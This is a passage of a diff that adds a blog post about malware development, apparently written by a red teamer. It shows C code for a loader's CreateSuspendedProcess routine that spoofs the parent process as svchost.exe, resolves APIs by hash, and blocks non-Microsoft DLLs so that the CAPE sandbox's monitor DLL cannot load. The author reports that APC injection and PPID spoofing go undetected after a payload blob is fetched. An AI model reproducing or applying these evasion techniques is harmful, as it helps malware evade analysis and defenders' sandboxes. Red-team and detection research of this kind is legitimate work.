+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>phThread <span style="color:#f92672">=</span> Pi.hThread;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>pdwProcessID <span style="color:#f92672">=</span> Pi.dwProcessId;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// End of Function
+</span></span></span><span style="display:flex;"><span>_EoF:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (Si.lpAttributeList) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, Si.lpAttributeList);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>phThread <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I validated that the child process now points to <code>svchost.exe</code> process as parent process and shows <code>C:\Windows\System32</code> as current directory.</p>
+<p><img src="./netutil6-ppid-spoofing.png" alt="netutil6-ppid-spoofing"></p>
+<h3 id="the-stump-of-the-fallen-tree">The stump of the fallen tree</h3>
+<p>CAPE no longer showed the process tree from the loader binary.</p>
+<p><img src="./netutil6-no-process-tree.png" alt="netutil6-no-process-tree"></p>
+<p>But, it did detect the PPID spoofing.</p>
+<p><img src="./netutil6-ppid-spoofing-detection.png" alt="netutil6-ppid-spoofing-detection"></p>
+<p>I tweaked the <code>CreateSuspendedProcess</code> a little to use hash-based resolution for <code>InitializeProcThreadAttributeList</code> and <code>UpdateProcThreadAttribute</code>.</p>
+<p><img src="./netutil6-hashed-winapi-ppid-spoofing.png" alt="netutil6-hashed-winapi-ppid-spoofing"></p>
+<p>To no one&rsquo;s surprise, it did not affect the detection as CAPE performs runtime analysis. Still, it was good to have static signatures out of the way.</p>
+<h2 id="eliminating-the-sensor">Eliminating the sensor</h2>
+<p>CAPE uses the aptly named <a href="https://github.com/kevoreilly/capemon"><code>capemon.dll</code></a> for detections.</p>
+<blockquote>
+<p>Much of the functionality of CAPE is contained within the monitor; the CAPE debugger, extracted payloads, process dumps and import reconstruction are implemented within capemon. CAPE&rsquo;s loader is also part of this project.</p>
+</blockquote>
+<p>If I limited loaded DLLs to only those signed by Microsoft, it would possibly stop CAPE from loading its DLL into my process. To test this thesis, all I needed was to extend the <code>UpdateProcThreadAttribute</code> to enable the mitigation policy to block non-microsoft DLLs (<code>PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code>). Following is the updated <code>CreateSuspendedProcess</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CreateSuspendedProcess</span>(
+</span></span><span style="display:flex;"><span>	IN	PH_API	pHashedApis,
+</span></span><span style="display:flex;"><span>	IN	LPCWSTR	lpszProcessName,
+</span></span><span style="display:flex;"><span>	IN	HANDLE	hParentProcess,
+</span></span><span style="display:flex;"><span>	OUT	PHANDLE	phProcess,
+</span></span><span style="display:flex;"><span>	OUT	PHANDLE	phThread,
+</span></span><span style="display:flex;"><span>	OUT	PDWORD	pdwProcessID
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// CODE MENTIONED BEFORE ...
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pInitializeProcThreadAttributeList</span>(Si.lpAttributeList, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>sThreadAttrListSize);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// PPID Spoofing
+</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pUpdateProcThreadAttribute</span>(Si.lpAttributeList, <span style="color:#ae81ff">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, <span style="color:#f92672">&amp;</span>hParentProcess, <span style="color:#66d9ef">sizeof</span>(HANDLE), NULL, NULL)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;UpdateProcThreadAttribute failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Enable blocking of non-Microsoft signed DLLs
+</span></span></span><span style="display:flex;"><span>	DWORD64 dwPolicy <span style="color:#f92672">=</span> PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pUpdateProcThreadAttribute</span>(Si.lpAttributeList, <span style="color:#ae81ff">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, <span style="color:#f92672">&amp;</span>dwPolicy, <span style="color:#66d9ef">sizeof</span>(DWORD64), NULL, NULL)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;UpdateProcThreadAttribute failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Si.StartupInfo.cb <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(STARTUPINFOEXW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pCreateProcessW</span>(NULL, lpszTargetProcessPath, NULL, NULL, FALSE, DEBUG_PROCESS <span style="color:#f92672">|</span> EXTENDED_STARTUPINFO_PRESENT, NULL, SysDir, <span style="color:#f92672">&amp;</span>Si, <span style="color:#f92672">&amp;</span>Pi)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;CreateProcessW failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// CODE MENTIONED BEFORE ...
+</span></span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The following screenshot shows the mitigation policy enabled for the child process.</p>
+<p><img src="./netutil6-dll-mitigation-policy.png" alt="netutil6-dll-mitigation-policy"></p>
+<h2 id="final-showdown">Final Showdown</h2>
+<p>Unlike the previous iterations, this mitigation allowed me to bypass the function traces for process-creation altogether.</p>
+<p><img src="./netutil6-createprocessinternalw-detection.png" alt="netutil6-createprocessinternalw-detection"></p>
+<p><img src="./netutil6-no-createprocessinternalw.png" alt="netutil6-no-createprocessinternalw"></p>
+<p>CAPE did trace the calls to <code>UpdateProcThreadAttribute</code> to update child process and the <code>NtOpenProcess</code> call for resuming process, after the blob was fetched from internet.</p>
+<p><img src="./netutil6-final-function-trace.png" alt="netutil6-final-function-trace"></p>
+<p>But it was not a significant issue, as there were no detections of APC Injection or PPID Spoofing.</p>
+<p><img src="./netutil6-no-ppid-no-apc-injection.png" alt="netutil6-no-ppid-no-apc-injection"></p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/malware-development/">#malware development</a>
+        
+            <a
+                
+                href="/tags/programming/">#programming</a>
+        
+            <a
+                
+                href="/tags/red-team/">#red team</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2026 &copy; Just adhere to <a href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a>
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
